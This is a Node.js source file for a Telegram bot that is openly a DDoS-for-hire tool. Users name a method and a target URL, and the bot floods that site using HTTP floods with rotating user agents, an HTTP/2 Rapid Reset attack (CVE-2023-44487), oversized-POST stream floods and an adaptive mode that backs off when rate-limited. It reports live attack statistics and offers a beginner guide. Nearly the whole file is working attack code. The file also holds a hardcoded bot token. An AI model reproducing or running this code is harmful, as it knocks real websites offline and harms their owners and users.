#!/usr/bin/env node
const { Telegraf, Markup } = require('telegraf');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { URL } = require('url');
const { Client } = require('undici');
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');


const BOT_TOKEN = process.env.BOT_TOKEN || '8174333801:AAEl8uUUh4itzlgGlGx2-q2UqBxbtTSFiDs';
const bot = new Telegraf(BOT_TOKEN);

const BOTANICAL_METHODS = {
    'gentle-breeze': { name: 'Gentle Breeze', desc: 'Standard HTTP flow like a soft wind', emoji: '🍃', type: 'standard' },
    'petal-storm': { name: 'Petal Storm', desc: 'Rapid Reset technique (CVE-2023-44487)', emoji: '🌸', type: 'h2-attack' },
    'nectar-overflow': { name: 'Nectar Overflow', desc: 'MadeYouReset stream overflow', emoji: '🍯', type: 'h2-attack' },
    'root-system': { name: 'Root System', desc: 'Multi-protocol distributed roots', emoji: '🌱', type: 'multi' },
    'blossom-burst': { name: 'Blossom Burst', desc: 'Concurrent bloom of requests', emoji: '💮', type: 'burst' },
    'thorn-barrier': { name: 'Thorn Barrier', desc: 'Adaptive delay on defenses', emoji: '🌹', type: 'adaptive' },
    'pollen-cloud': { name: 'Pollen Cloud', desc: 'Distributed request cloud', emoji: '🌼', type: 'distributed' },
    'solar-flare': { name: 'Solar Flare', desc: 'High-intensity UV radiation', emoji: '☀️', type: 'intense' }
};

const USER_AGENTS = [
    //Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",

    // Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36"
];

const userSessions = new Map();
const activeAttacks = new Map();

class BotanicalAttack {
    constructor(userId, method, targetUrl) {
        this.userId = userId;
        this.method = method;
        this.target = new URL(targetUrl);
        this.stats = {
            startTime: Date.now(),
            requests: 0,
            responses: 0,
            errors: 0,
            statusCodes: {},
            lastUpdate: Date.now()
        };
        this.active = true;
        this.workers = [];
        this.monitorInterval = null;
    }

    async start() {
        const methodConfig = BOTANICAL_METHODS[this.method];
        const attackGifs = {
            'gentle-breeze': 'https://b.top4top.io/p_3624gk4au1.jpg',
            'petal-storm': 'https://i.pinimg.com/originals/d9/0c/bf/d90cbff2c30e78be5710c94693aff039.gif',
            'nectar-overflow': 'https://i.pinimg.com/originals/3b/b2/cc/3bb2ccae497979a546214abfa2b32c57.gif',
            'root-system': 'https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyb3oyYjd5NWZuanJ5NTd3cDFoa3BjN2xsd2Rjd2U0Y2lkeHdwNDZkeiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Rpl1sod1vCXK0L2SUN/giphy.gif',
            'blossom-burst': 'https://i.pinimg.com/originals/db/80/8d/db808d106c91d92a6d96c0554c6e54b1.gif'
        };

        await bot.telegram.sendAnimation(this.userId, attackGifs[this.method] || attackGifs['gentle-breeze'], {
            caption: `🌸 *${methodConfig.name}* ${methodConfig.emoji}\n` +
                    `Target: \`${this.target.hostname}\`\n` +
                    `Method: ${methodConfig.desc}\n` +
                    `Status: *ACTIVATING* ⚡`,
            parse_mode: 'Markdown'
        });

        switch(this.method) {
            case 'gentle-breeze':
                this.startGentleBreeze();
                break;
            case 'petal-storm':
                this.startPetalStorm();
                break;
            case 'nectar-overflow':
                this.startNectarOverflow();
                break;
            case 'root-system':
                this.startRootSystem();
                break;
            case 'blossom-burst':
                this.startBlossomBurst();
                break;
            case 'thorn-barrier':
                this.startThornBarrier();
                break;
            case 'pollen-cloud':
                this.startPollenCloud();
                break;
            case 'solar-flare':
                this.startSolarFlare();
                break;
        }

        
        this.startMonitoring();
    }

    startGentleBreeze() {
        
        for(let i = 0; i < 5; i++) {
            const worker = setInterval(async () => {
                if(!this.active) return;
                
                const req = http.request({
                    hostname: this.target.hostname,
                    port: this.target.port || 80,
                    path: this.target.pathname,
                    method: 'GET',
                    headers: {
                        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
                    }
                }, (res) => {
                    this.stats.responses++;
                    this.stats.statusCodes[res.statusCode] = (this.stats.statusCodes[res.statusCode] || 0) + 1;
                });

                req.on('error', () => {
                    this.stats.errors++;
                });

                req.end();
                this.stats.requests++;
            }, 100);

            this.workers.push(worker);
        }
    }

    startPetalStorm() {
        
        const client = http2.connect(this.target.origin, { rejectUnauthorized: false });
        
        const attackWorker = setInterval(() => {
            if(!this.active) return;
            
            for(let i = 0; i < 10; i++) {
                const stream = client.request({
                    ':method': 'GET',
                    ':path': this.target.pathname,
                    ':authority': this.target.hostname
                });
                
                stream.on('response', () => {
                    this.stats.responses++;
                    stream.close(http2.constants.NGHTTP2_CANCEL);
                });
                
                this.stats.requests++;
            }
        }, 50);
        
        this.workers.push(attackWorker);
    }

    startNectarOverflow() {
        
        const client = http2.connect(this.target.origin, { rejectUnauthorized: false });
        
        const overflowWorker = setInterval(() => {
            if(!this.active) return;
            
            try {
                const stream = client.request({
                    ':method': 'POST',
                    ':path': this.target.pathname,
                    ':authority': this.target.hostname,
                    'content-length': '1000000'
                });
                
                const largeBuffer = Buffer.alloc(10000);
                stream.write(largeBuffer);
                
                stream.on('error', () => {
                    this.stats.errors++;
                });
                
                this.stats.requests++;
            } catch(e) {
                
            }
        }, 100);
        
        this.workers.push(overflowWorker);
    }

    startRootSystem() {
        
        const protocols = ['http:', 'https:'];
        
        protocols.forEach(protocol => {
            const worker = setInterval(() => {
                if(!this.active) return;
                
                const module = protocol === 'https:' ? https : http;
                const req = module.request({
                    hostname: this.target.hostname,
                    port: protocol === 'https:' ? 443 : 80,
                    path: this.target.pathname,
                    method: 'GET'
                }, (res) => {
                    this.stats.responses++;
                });
                
                req.on('error', () => {
                    this.stats.errors++;
                });
                
                req.end();
                this.stats.requests++;
            }, 150);
            
            this.workers.push(worker);
        });
    }

    startBlossomBurst() {
        
        for(let i = 0; i < 10; i++) {
            const worker = setInterval(() => {
                if(!this.active) return;
                
                for(let j = 0; j < 5; j++) {
                    const req = http.request({
                        hostname: this.target.hostname,
                        port: this.target.port || 80,
                        path: this.target.pathname,
                        method: 'GET'
                    });
                    
                    req.on('error', () => {});
                    req.end();
                    this.stats.requests++;
                }
                
                this.stats.responses += 3; 
            }, 1000);
            
            this.workers.push(worker);
        }
    }

    startThornBarrier() {
        
        let delay = 0;
        
        const worker = setInterval(async () => {
            if(!this.active) return;
            
            if(delay > 0) {
                await new Promise(resolve => setTimeout(resolve, delay));
            }
            
            const req = http.request({
                hostname: this.target.hostname,
                port: this.target.port || 80,
                path: this.target.pathname,
                method: 'GET'
            }, (res) => {
                if(res.statusCode === 429 || res.statusCode === 503) {
                    delay = Math.min(5000, delay + 500);
                } else {
                    delay = Math.max(0, delay - 100);
                }
                this.stats.responses++;
            });
            
            req.on('error', () => {
                this.stats.errors++;
            });
            
            req.end();
            this.stats.requests++;
        }, 300);
        
        this.workers.push(worker);
    }

    startPollenCloud() {
        for(let i = 0; i < 8; i++) {
            const worker = setInterval(() => {
                if(!this.active) return;
                
                const headers = {
                    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                };
                
                const req = http.request({
                    hostname: this.target.hostname,
                    port: this.target.port || 80,
                    path: this.target.pathname,
                    method: 'GET',
                    headers: headers
                }, (res) => {
                    this.stats.responses++;
                });
                
                req.on('error', () => {
                    this.stats.errors++;
                });
                
                req.end();
                this.stats.requests++;
            }, 200);
            
            this.workers.push(worker);
        }
    }

    startSolarFlare() {
       
        for(let i = 0; i < 20; i++) {
            const worker = setInterval(() => {
                if(!this.active) return;
                
                for(let j = 0; j < 3; j++) {
                    const req = http.request({
                        hostname: this.target.hostname,
                        port: this.target.port || 80,
                        path: this.target.pathname,
                        method: 'GET',
                        timeout: 1000
                    }, () => {
                        this.stats.responses++;
                    });
                    
                    req.on('error', () => {
                        this.stats.errors++;
                    });
                    
                    req.end();
                    this.stats.requests++;
                }
            }, 50);
            
            this.workers.push(worker);
        }
    }

    startMonitoring() {
        this.monitorInterval = setInterval(async () => {
            if(!this.active) {
                clearInterval(this.monitorInterval);
                return;
            }
            
            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const rps = (this.stats.requests / elapsed).toFixed(2);
            
            if(Date.now() - this.stats.lastUpdate > 30000) {
                this.stats.lastUpdate = Date.now();
                
                const statusMessage = 
                    `🌸 *${BOTANICAL_METHODS[this.method].name}* ${BOTANICAL_METHODS[this.method].emoji}\n` +
                    `⏱ Duration: ${Math.floor(elapsed)}s\n` +
                    `📤 Requests: ${this.stats.requests}\n` +
                    `📥 Responses: ${this.stats.responses}\n` +
                    `❌ Errors: ${this.stats.errors}\n` +
                    `⚡ RPS: ${rps}\n` +
                    `Status: *ACTIVE* 🔥`;
                
                await bot.telegram.sendMessage(this.userId, statusMessage, {
                    parse_mode: 'Markdown'
                });
            }
        }, 5000);
    }

    stop() {
        this.active = false;
        this.workers.forEach(worker => clearInterval(worker));
        if(this.monitorInterval) clearInterval(this.monitorInterval);
        
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        const rps = (this.stats.requests / elapsed).toFixed(2);
        
        return {
            method: BOTANICAL_METHODS[this.method].name,
            duration: elapsed,
            requests: this.stats.requests,
            responses: this.stats.responses,
            errors: this.stats.errors,
            rps: rps
        };
    }
}

bot.start((ctx) => {
    const welcomeGif = 'https://gifdb.com/images/high/soft-aesthetic-anime-welcome-8wsc3t0te0slhhyk.gif';
    ctx.replyWithAnimation(welcomeGif, {
        caption: `🌸 *Welcome to Fragrant Flower Net* 🌸\n\n` +
                `*Botanical DDoS Framework by Hyouka.PCS*\n\n` +
                `Available methods:\n` +
                Object.entries(BOTANICAL_METHODS).map(([key, method]) => 
                    `${method.emoji} /${key} - ${method.name}\n` +
                    `  ${method.desc}`
                ).join('\n\n') +
                `\n\nUse /attack <method> <url> to begin\n` +
                `Example: /attack petal-storm https://example.com`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🌺 View Methods', 'show_methods')],
            [Markup.button.callback('⚡ Quick Start', 'quick_start')],
            [Markup.button.callback('📚 Documentation', 'docs')]
        ])
    });
});

bot.command('methods', (ctx) => {
    const methodsGif = 'https://i.pinimg.com/originals/79/22/12/7922126f24dcee382c0a99c907a56499.gif';
    
    let methodsText = `*🌸 Botanical Attack Methods 🌸*\n\n`;
    
    Object.entries(BOTANICAL_METHODS).forEach(([key, method]) => {
        methodsText += 
            `${method.emoji} *${method.name}*\n` +
            `Command: /${key}\n` +
            `Type: ${method.type}\n` +
            `${method.desc}\n\n`;
    });
    
    ctx.replyWithAnimation(methodsGif, {
        caption: methodsText,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            Object.entries(BOTANICAL_METHODS).slice(0, 4).map(([key, method]) => 
                Markup.button.callback(method.emoji + ' ' + method.name, `method_${key}`)
            ),
            Object.entries(BOTANICAL_METHODS).slice(4, 8).map(([key, method]) => 
                Markup.button.callback(method.emoji + ' ' + method.name, `method_${key}`)
            )
        ])
    });
});

bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if(args.length < 2) {
        return ctx.reply(`Usage: /attack <method> <url>\nExample: /attack petal-storm https://example.com\n\nUse /methods to see available methods`);
    }
    
    const method = args[0];
    const targetUrl = args[1];
    
    if(!BOTANICAL_METHODS[method]) {
        return ctx.reply(`Unknown method: ${method}\nUse /methods to see available methods`);
    }
    
    try {
        new URL(targetUrl);
    } catch(e) {
        return ctx.reply('Invalid URL format');
    }
    
    if(activeAttacks.has(ctx.from.id)) {
        return ctx.reply('You already have an active attack. Use /stop to stop it first.');
    }
    
    const attack = new BotanicalAttack(ctx.from.id, method, targetUrl);
    activeAttacks.set(ctx.from.id, attack);
    
    await ctx.reply(`🌺 Starting *${BOTANICAL_METHODS[method].name}* attack...\nTarget: ${targetUrl}\nMethod ID: ${method}\n\nAttack will begin momentarily.`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🛑 Stop Attack', 'stop_attack')],
            [Markup.button.callback('📊 View Stats', 'view_stats')]
        ])
    });
    
    attack.start();
});

bot.command('stop', (ctx) => {
    const userId = ctx.from.id;
    
    if(!activeAttacks.has(userId)) {
        return ctx.reply('No active attack found.');
    }
    
    const attack = activeAttacks.get(userId);
    const results = attack.stop();
    activeAttacks.delete(userId);
    
    const resultsText = 
        `🌸 *Attack Stopped* 🌸\n\n` +
        `Method: ${results.method}\n` +
        `Duration: ${results.duration.toFixed(1)}s\n` +
        `Total Requests: ${results.requests}\n` +
        `Successful Responses: ${results.responses}\n` +
        `Errors: ${results.errors}\n` +
        `Average RPS: ${results.rps}\n\n` +
        `*Botanical cycle complete.*`;
    
    ctx.reply(resultsText, { parse_mode: 'Markdown' });
});

bot.command('status', (ctx) => {
    const userId = ctx.from.id;
    
    if(!activeAttacks.has(userId)) {
        return ctx.reply('No active attack running.');
    }
    
    const attack = activeAttacks.get(userId);
    const elapsed = (Date.now() - attack.stats.startTime) / 1000;
    const rps = (attack.stats.requests / elapsed).toFixed(2);
    
    const statusText = 
        `🌸 *Active Attack Status* 🌸\n\n` +
        `Method: ${BOTANICAL_METHODS[attack.method].name}\n` +
        `Target: ${attack.target.hostname}\n` +
        `Duration: ${Math.floor(elapsed)}s\n` +
        `Requests: ${attack.stats.requests}\n` +
        `Responses: ${attack.stats.responses}\n` +
        `Errors: ${attack.stats.errors}\n` +
        `Current RPS: ${rps}\n` +
        `Status: *ACTIVE* 🔥`;
    
    ctx.reply(statusText, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🛑 Stop Attack', 'stop_attack')],
            [Markup.button.callback('📊 Detailed Stats', 'detailed_stats')]
        ])
    });
});

bot.action('show_methods', (ctx) => {
    ctx.deleteMessage();
    ctx.replyWithAnimation('https://i.pinimg.com/originals/e3/b3/a6/e3b3a674efab17a9d1baeb0e1ffd5a1a.gif', {
        caption: `*Select a Botanical Method:*\n\n` +
                Object.entries(BOTANICAL_METHODS).map(([key, method]) => 
                    `${method.emoji} *${method.name}* - /${key}\n${method.desc}`
                ).join('\n\n'),
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🌺 Gentle Breeze', 'method_gentle-breeze')],
            [Markup.button.callback('🌸 Petal Storm', 'method_petal-storm')],
            [Markup.button.callback('🍯 Nectar Overflow', 'method_nectar-overflow')],
            [Markup.button.callback('🌱 Root System', 'method_root-system')],
            [Markup.button.callback('💮 Blossom Burst', 'method_blossom-burst')]
        ])
    });
});

bot.action('stop_attack', async (ctx) => {
    const userId = ctx.from.id;
    
    if(!activeAttacks.has(userId)) {
        return ctx.answerCbQuery('No active attack found');
    }
    
    const attack = activeAttacks.get(userId);
    const results = attack.stop();
    activeAttacks.delete(userId);
    
    await ctx.answerCbQuery('Attack stopped');
    
    const resultsGif = 'https://i.pinimg.com/originals/93/04/2c/93042c55e6810b24ede71099236f34bb.gif';
    ctx.replyWithAnimation(resultsGif, {
        caption: `🌸 *Botanical Attack Completed* 🌸\n\n` +
                `Method: ${results.method}\n` +
                `Duration: ${results.duration.toFixed(1)}s\n` +
                `Requests Sent: ${results.requests}\n` +
                `Responses Received: ${results.responses}\n` +
                `Success Rate: ${((results.responses / results.requests) * 100 || 0).toFixed(1)}%\n` +
                `Average RPS: ${results.rps}\n\n` +
                `*The garden rests... until next bloom.*`,
        parse_mode: 'Markdown'
    });
});

Object.keys(BOTANICAL_METHODS).forEach(methodKey => {
    bot.action(`method_${methodKey}`, (ctx) => {
        const method = BOTANICAL_METHODS[methodKey];
        const methodGifs = {
            'gentle-breeze': 'https://media.giphy.com/media/3o7TKsQ8gTp3WqXq1q/giphy.gif',
            'petal-storm': 'https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif',
            'nectar-overflow': 'https://media.giphy.com/media/26tknCqiJrBQG6DrC/giphy.gif',
            'root-system': 'https://media.giphy.com/media/3o7TKz8a8XWv7XWv7W/giphy.gif'
        };
        
        ctx.replyWithAnimation(methodGifs[methodKey] || methodGifs['gentle-breeze'], {
            caption: `${method.emoji} *${method.name}*\n\n` +
                    `Type: ${method.type.toUpperCase()}\n` +
                    `Command: /attack ${methodKey} <url>\n\n` +
                    `${method.desc}\n\n` +
                    `*Technical Details:*\n` +
                    `• Protocol: HTTP/1.1${method.type.includes('h2') ? ' + HTTP/2' : ''}\n` +
                    `• Concurrency: ${method.type === 'intense' ? 'High' : 'Medium'}\n` +
                    `• Stealth Level: ${method.type === 'standard' ? 'Low' : 'Medium'}\n\n` +
                    `Usage: \`/attack ${methodKey} https://target.com\``,
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback(`⚡ Use ${method.name}`, `use_${methodKey}`)],
                [Markup.button.callback('🔙 Back to Methods', 'show_methods')]
            ])
        });
    });
    
    bot.action(`use_${methodKey}`, (ctx) => {
        ctx.reply(`To use *${BOTANICAL_METHODS[methodKey].name}*:\n\n` +
                 `Send: \`/attack ${methodKey} https://target-url.com\`\n\n` +
                 `Example:\n` +
                 `\`/attack ${methodKey} https://example.com\`\n\n` +
                 `Replace \`https://example.com\` with your target URL.`,
                 { parse_mode: 'Markdown' });
    });
});

bot.action('quick_start', (ctx) => {
    ctx.replyWithAnimation('https://i.pinimg.com/originals/9a/df/15/9adf1532227cce79218a6d2074c7d11e.gif', {
        caption: `*⚡ Quick Start Guide ⚡*\n\n` +
                `1. Choose a method: /methods\n` +
                `2. Start attack: /attack <method> <url>\n` +
                `3. Monitor: /status\n` +
                `4. Stop: /stop\n\n` +
                `*Example Flow:*\n` +
                `\`/attack petal-storm https://example.com\`\n` +
                `Wait 30 seconds\n` +
                `\`/status\` to check progress\n` +
                `\`/stop\` to end attack\n\n` +
                `*Recommended for Beginners:*\n` +
                `• 🌸 Petal Storm - HTTP/2 attack\n` +
                `• 🍃 Gentle Breeze - Standard test\n` +
                `• 🌱 Root System - Multi-protocol`,
        parse_mode: 'Markdown'
    });
});

bot.command('help', (ctx) => {
    ctx.reply(`*Fragrant Flower Net Help* 🌸\n\n` +
             `*Commands:*\n` +
             `/start - Start bot and show menu\n` +
             `/methods - Show all botanical methods\n` +
             `/attack <method> <url> - Start attack\n` +
             `/status - Check active attack status\n` +
             `/stop - Stop current attack\n` +
             `/help - This help message\n\n` +
             `*Examples:*\n` +
             `\`/attack petal-storm https://target.com\`\n` +
             `\`/attack gentle-breeze http://test.site\`\n\n` +
             `*Support:*\n` +
             `Created by Hyouka.PCS\n` +
             `Botanical DDoS Framework v2.1`,
             { parse_mode: 'Markdown' });
});

bot.catch((err, ctx) => {
    console.error(`Error for ${ctx.updateType}:`, err);
    ctx.reply('🌸 An error occurred in the garden. Please try again.');
});

console.log(chalk.green('🌸 Fragrant Flower Net Bot starting...'));
console.log(chalk.cyan('Created by Hyouka.PCS'));
console.log(chalk.yellow('Fragrant DDoS v2.1'));

bot.launch().then(() => {
    console.log(chalk.green('✅ Bot is now running!'));
    console.log(chalk.blue('🌺 Send /start to begin'));
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

setInterval(() => {
    const now = Date.now();
    for(const [userId, attack] of activeAttacks.entries()) {
        if(now - attack.stats.lastUpdate > 600000) { 
            attack.stop();
            activeAttacks.delete(userId);
            bot.telegram.sendMessage(userId, 
                '🌸 Your botanical attack has been automatically stopped due to inactivity.'
            );
        }
    }
}, 60000);

const globalStats = {
    totalAttacks: 0,
    totalRequests: 0,
    activeUsers: 0,
    methodsUsed: {}
};

setInterval(() => {
    globalStats.activeUsers = activeAttacks.size;
    console.log(chalk.magenta(`🌺 Global Stats: ${globalStats.totalAttacks} attacks, ${globalStats.activeUsers} active users`));
}, 30000);